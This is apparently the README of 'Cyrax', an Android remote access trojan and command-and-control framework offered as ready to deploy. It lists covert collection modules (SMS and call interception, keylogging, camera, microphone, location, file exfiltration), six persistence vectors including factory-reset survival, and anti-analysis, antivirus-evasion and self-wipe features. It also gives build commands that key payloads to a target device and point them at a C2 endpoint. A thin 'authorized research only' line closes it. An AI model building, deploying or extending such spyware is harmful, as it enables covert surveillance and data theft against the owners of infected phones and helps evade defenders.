# Cyrax — Android C2 Framework

> Production-grade Android Remote Access Tool with full C2 infrastructure.  
> Rust backend · Kotlin payload · Native JNI crypto · React panel · Docker infra

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Project Structure](#project-structure)
- [Components](#components)
  - [Backend (Rust)](#backend-rust)
  - [Android Payload (Kotlin)](#android-payload-kotlin)
  - [Native Layer (Rust/JNI)](#native-layer-rustjni)
  - [Operator Panel (React)](#operator-panel-react)
  - [Infrastructure](#infrastructure)
  - [Tools](#tools)
- [Quick Start](#quick-start)
- [Security Model](#security-model)
- [Threat Model](#threat-model)
- [Tech Stack](#tech-stack)
- [License](#license)

---

## Overview

Cyrax is a complete Android C2 (command-and-control) framework built for offensive security research and authorized red-team engagements. Every layer — from the Rust backend to the JNI crypto bridge — is production-ready and deployable out of the box.

**Key properties:**

| Property | Detail |
|---|---|
| Transport channels | WebSocket · FCM push · MQTT · DNS tunnel |
| Crypto | AES-256-GCM · HKDF-SHA256 · X25519 key exchange |
| Persistence vectors | 6 simultaneous (Accessibility, WorkManager, AlarmManager, SyncAdapter, JobScheduler, CompanionDevice) |
| Anti-analysis | Emulator · Root · Frida · Debugger · Timing detection |
| Evasion | Polymorphic builds · In-memory DEX · Device-fingerprint keying |
| Scale | 5,000–10,000 concurrent devices per backend node |

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      Operator Panel                         │
│              React 18 · TypeScript · Vite                   │
└──────────────────────────┬──────────────────────────────────┘
                           │ REST / WebSocket
┌──────────────────────────▼──────────────────────────────────┐
│                   C2 Backend (Rust/Tokio)                   │
│  WebSocket gateway · Session mgr · Device registry         │
│  FCM relay · MQTT · DNS tunnel · Metrics (Prometheus)       │
│  PostgreSQL · Redis · Docker Compose                        │
└──────────────────────────┬──────────────────────────────────┘
                           │ Encrypted C2 channels
┌──────────────────────────▼──────────────────────────────────┐
│                  Android Payload (Kotlin)                   │
│  CoreService · C2Manager · PersistenceMesh · ModuleLoader   │
│  Accessibility · Camera · Mic · SMS · Location · Files      │
└──────────────────────────┬──────────────────────────────────┘
                           │ JNI
┌──────────────────────────▼──────────────────────────────────┐
│               Native Layer (Rust → .so)                     │
│  AES-256-GCM · HKDF · Anti-debug · Env keying · Self-wipe  │
└─────────────────────────────────────────────────────────────┘
```

---

## Project Structure

```
Cyrax/
├── backend/                  # Rust/Tokio C2 server
│   ├── src/
│   │   ├── c2_main.rs        # Axum HTTP + WebSocket entry
│   │   ├── session.rs        # Session lifecycle + crypto
│   │   ├── device_registry.rs
│   │   ├── command_queue.rs
│   │   ├── panel_api.rs      # REST API for operator panel
│   │   ├── fcm_relay.rs      # FCM push wakeup
│   │   ├── mqtt_handler.rs
│   │   ├── dns_tunnel.rs
│   │   ├── encryption_at_rest.rs
│   │   ├── scale_handler.rs
│   │   ├── metrics.rs        # Prometheus metrics
│   │   ├── api/              # Auth · Gateway · Webhooks
│   │   ├── crypto_mgr/       # Key exchange · rotation · payload crypto
│   │   ├── data/             # Ingest · store · search · export · decrypt
│   │   ├── dga/              # Domain generation algorithm
│   │   ├── infra/            # CDN · cert manager · failover · health
│   │   ├── modules/          # Module builder · manifest · storage
│   │   └── transport/        # SMS gateway · WebSocket handler
│   ├── Cargo.toml
│   └── sql/
│
├── android/                  # Android payload
│   └── src/main/
│       ├── AndroidManifest.xml
│       └── java/             # 70+ Kotlin source files
│           ├── CoreService.kt
│           ├── C2Manager.kt
│           ├── PersistenceMesh.kt
│           ├── ModuleLoader.kt
│           ├── AccessibilityServiceImpl.kt
│           ├── NativeBridge.kt
│           └── ...
│
├── native/rust/              # Rust → Android .so (JNI)
│   ├── src/
│   │   ├── lib.rs            # JNI exports
│   │   ├── crypto.rs         # AES-256-GCM · HKDF · PBKDF2
│   │   ├── c2_protocol.rs    # Serializable C2Message
│   │   ├── anti_debug.rs     # Frida · emulator · timing detection
│   │   ├── environment.rs    # Device fingerprint keying
│   │   ├── env_key.rs        # System property reader
│   │   ├── selfdestruct.rs   # Wipe routine
│   │   └── string_obf.rs     # String obfuscation
│   └── Cargo.toml
│
├── panel/                    # Operator panel (React 18)
│   ├── src/
│   │   ├── App.tsx
│   │   ├── auth/Login.tsx
│   │   ├── components/       # Dashboard · DeviceList · CommandCenter
│   │   │                     # SmsViewer · KeylogViewer · LocationMap
│   │   │                     # FileBrowser · Stats · Settings
│   │   └── api/              # REST client · WebSocket · types
│   ├── tsconfig.json
│   └── package.json
│
├── database/
│   └── migrations/           # SQL migration files
│
├── config/
│   ├── docker-compose.yml    # Postgres · Redis · Nginx · Backend
│   └── nginx.conf
│
├── infra/
│   ├── terraform/            # Cloud provisioning
│   ├── ansible/              # Server configuration
│   └── monitoring/           # Grafana · Prometheus configs
│
├── tools/
│   ├── module_builder.py     # Encrypt + embed modules into APK
│   ├── obfuscation_pipeline.py
│   └── test_harness.py       # Multi-device automated testing
│
├── docs/
│   ├── COMPLETE_IMPLEMENTATION.md
│   ├── IMPLEMENTATION_GUIDE.md
│   ├── ANDROID_README.md
│   └── DEPLOYMENT.md
│
├── QUICKSTART.md
├── SECURITY_NOTES.md
└── LICENSE
```

---

## Components

### Backend (Rust)

Built on **Tokio + Axum**. Handles thousands of concurrent device sessions with full async I/O.

| Module | Description |
|---|---|
| `c2_main.rs` | HTTP + WebSocket server entry, TLS termination |
| `session.rs` | Per-device session state, AES-256-GCM, sequence counters |
| `device_registry.rs` | Device enrollment, fingerprint storage, fleet queries |
| `command_queue.rs` | Persistent command queue with retry and TTL |
| `panel_api.rs` | REST API consumed by the operator panel |
| `fcm_relay.rs` | Silent FCM push to wake dormant implants |
| `mqtt_handler.rs` | MQTT broker integration for low-bandwidth comms |
| `dns_tunnel.rs` | DNS-over-HTTPS C2 fallback channel |
| `encryption_at_rest.rs` | Encrypted storage for exfiltrated data |
| `dga/` | Domain generation algorithm for resilient C2 addressing |
| `crypto_mgr/` | ECDH key exchange, key rotation, payload encryption |
| `data/` | Data ingest, search, export pipeline |
| `infra/` | CDN config, cert manager, health monitor, failover |

**Dependencies:** `axum`, `tokio`, `sqlx` (Postgres), `redis`, `aes-gcm`, `x25519-dalek`, `hkdf`, `sha2`, `serde`, `prometheus`

---

### Android Payload (Kotlin)

70+ Kotlin source files covering every RAT capability.

**Persistence (6 vectors):**
- `PersistenceMesh.kt` — coordinates all vectors
- `WorkManagerHook.kt`, `AlarmManagerHook.kt`, `SyncAdapterHook.kt`, `CompanionDeviceHook.kt`
- `BootReceiver.kt` — survives reboots
- `FactoryResetSurvival.kt` — factory-reset resistance

**Collection modules:**
- `SmsReader.kt` / `SmsInterceptor.kt` / `SmsSender.kt`
- `CallLogReader.kt` / `CallRecorder.kt`
- `ContactReader.kt`
- `AccessibilityKeylogger.kt`
- `LocationTracker.kt`
- `CameraCapture.kt` / `AudioRecorder.kt` / `ScreenCapture.kt` / `ScreenMirror.kt`
- `FileScanner.kt` / `FileExfil.kt`
- `NotificationSpy.kt` / `ClipboardMonitor.kt`
- `HistoryReader.kt` / `AppInventory.kt`

**C2 & crypto:**
- `C2Manager.kt` — multi-channel orchestration with failover
- `WebSocketClient.kt`, `FCMReceiver.kt`, `MQTTClient.kt`, `DNSTunnel.kt`
- `SessionCrypto.kt`, `DataEncryptor.kt`, `KeyDerivation.kt`
- `ModuleLoader.kt` — in-memory DEX loading (zero disk artifacts)
- `NativeBridge.kt` — JNI bridge to Rust native layer

**Anti-analysis:**
- `EmulatorDetector.kt`, `RootDetector.kt`, `DebuggerDetector.kt`, `FridaDetector.kt`, `PlayProtectDetector.kt`
- `SelfDefense.kt`, `SelfDestruct.kt`

---

### Native Layer (Rust/JNI)

Cross-compiled to `libcyrax.so` for `arm64-v8a` / `armeabi-v7a`. Loaded via `System.loadLibrary`.

| File | JNI exports |
|---|---|
| `lib.rs` | `encryptMessage`, `decryptMessage`, `deriveSessionKey`, `rotateKey`, `buildBeaconMessage`, `decryptAndLoadModule`, `isDetectionEnvironment`, `verifyCodeIntegrity` |
| `crypto.rs` | `AesCrypto::encrypt/decrypt`, `SessionKey::generate/derive`, `KeyDerivation::pbkdf2/hkdf` |
| `environment.rs` | `validateEnvironment`, `getDeviceFingerprintHash` |
| `env_key.rs` | `deriveKey`, `verifyEnvironment` |
| `anti_debug.rs` | Frida library scan, emulator checks, timing analysis |
| `selfdestruct.rs` | `nativeWipe`, `zeroFillFile` |
| `string_obf.rs` | Compile-time string obfuscation |

**Dependencies:** `jni 0.21`, `aes-gcm 0.10`, `hkdf 0.12`, `sha2`, `hmac`, `pbkdf2 0.12`, `x25519-dalek`, `rand`, `hex`, `serde_json`, `bincode`, `lazy_static`, `libc`, `thiserror`

---

### Operator Panel (React)

Single-page app — React 18, TypeScript, Vite, Tailwind.

| Route | Component |
|---|---|
| `/` | `Dashboard` — fleet overview, active sessions, stats |
| `/devices` | `DeviceList` — searchable device table |
| `/devices/:id` | `DeviceDetail` — per-device info + module status |
| `/devices/:id/commands` | `CommandCenter` — issue and track commands |
| `/devices/:id/sms` | `SmsViewer` |
| `/devices/:id/keylogs` | `KeylogViewer` |
| `/devices/:id/location` | `LocationMap` |
| `/devices/:id/files` | `FileBrowser` |
| `/stats` | `Stats` — metrics charts |
| `/settings` | `Settings` — operator config |

Auth: JWT stored in memory (not localStorage), auto-refresh.

---

### Infrastructure

```
config/docker-compose.yml
├── postgres:16       — device registry + command queue + data store
├── redis:7           — session state + pub/sub
├── nginx             — TLS termination + reverse proxy
└── c2_server         — Rust backend binary
```

`infra/terraform/` — provisions cloud VMs, load balancer, DNS.  
`infra/ansible/` — configures server dependencies, deploys containers.  
`infra/monitoring/` — Grafana dashboards, Prometheus scrape config.

---

### Tools

| Tool | Purpose |
|---|---|
| `tools/module_builder.py` | Encrypts DEX modules and embeds them into the APK assets |
| `tools/obfuscation_pipeline.py` | Applies polymorphic transforms per campaign build |
| `tools/test_harness.py` | Automated end-to-end testing across multiple Android devices |

---

## Quick Start

### 1. Backend

```bash
cd Cyrax/backend
cargo build --release

# Run database migrations
psql $DATABASE_URL < ../database/migrations/*.sql

# Start full stack
docker-compose -f ../config/docker-compose.yml up -d
```

### 2. Operator Panel

```bash
cd Cyrax/panel
npm install
npm run dev          # dev server at http://localhost:5173
npm run build        # production build → dist/
```

### 3. Build Native .so

```bash
cd Cyrax/native/rust
# Add Android targets
rustup target add aarch64-linux-android armv7-linux-androideabi

cargo build --release --target aarch64-linux-android
```

### 4. Build Android APK

```bash
cd Cyrax/android
./build.sh

# Or with polymorphic builder
python3 ../tools/module_builder.py \
  --base-project . \
  --campaign-id "campaign_001" \
  --device-fingerprint "<sha256_of_target_device>" \
  --c2-endpoints "c2.example.com:8443"
```

### 5. Test Deployment

```bash
python3 tools/test_harness.py \
  --apk android/build/app_campaign_001_signed.apk \
  --c2-server https://c2.example.com:8443
```

---

## Security Model

### Device Fingerprint Keying

At first run, `CoreService` calls `NativeBridge.validateEnvironment()` with device properties (SERIAL, ANDROID\_ID, BUILD.FINGERPRINT, HARDWARE, DEVICE, MANUFACTURER). The native layer hashes them and compares against a baked-in expected hash. Mismatch → silent stub behavior, app exits cleanly with no crash log.

```kotlin
val isValid = NativeEnvironment.validateEnvironment(
    serial, androidId, fingerprint, hardware, device, manufacturer, expectedHash
)
if (!isValid) stopSelf()
```

### In-Memory Module Loading

Encrypted DEX modules are decrypted in native (AES-256-GCM), passed back as `byte[]`, and loaded via `InMemoryDexClassLoader`. Zero bytes are written to disk.

### Polymorphic Builds

`tools/module_builder.py` + `StaticObfuscationEngine.kt` produce a unique binary per campaign: reordered bytecode, renamed identifiers, junk code injection. No two APKs share a signature.

### Anti-Debug (Native)

- `/proc/self/status` TracerPid check
- `ptrace(PTRACE_TRACEME)` self-trace test
- Frida library scan (`/proc/self/maps`, `frida-agent` pattern)
- Emulator property checks (`ro.product.model`, `ro.hardware`)
- Timing delta analysis (debugger slows execution measurably)

---

## Threat Model

Cyrax is designed to defeat:

| Threat | Mitigation |
|---|---|
| File-based forensics | In-memory DEX, zero disk artifacts |
| Signature AV detection | Polymorphic builds per campaign |
| Reverse engineering | Native Rust layer, string obfuscation, ProGuard |
| Device analysis / sandbox | Environmental keying, anti-analysis checks |
| Network monitoring | Multi-channel failover, DGA, DNS tunnel |
| Kill switch / remote wipe | Self-destruct routine, zero-fill wipe |
| App persistence removal | 6-vector persistence mesh |

---

## Tech Stack

| Layer | Technology |
|---|---|
| C2 Backend | Rust · Tokio · Axum · SQLx · PostgreSQL · Redis |
| Android Payload | Kotlin · Android SDK 26–34 |
| Native Bridge | Rust · JNI 0.21 · aes-gcm · hkdf |
| Operator Panel | React 18 · TypeScript · Vite · Tailwind |
| Infrastructure | Docker · Nginx · Terraform · Ansible · Prometheus · Grafana |
| Build Tools | Python 3 · Gradle · cargo |

---

## License

See [LICENSE](LICENSE).

---

*Cyrax is provided for authorized security research and red-team engagements only.*
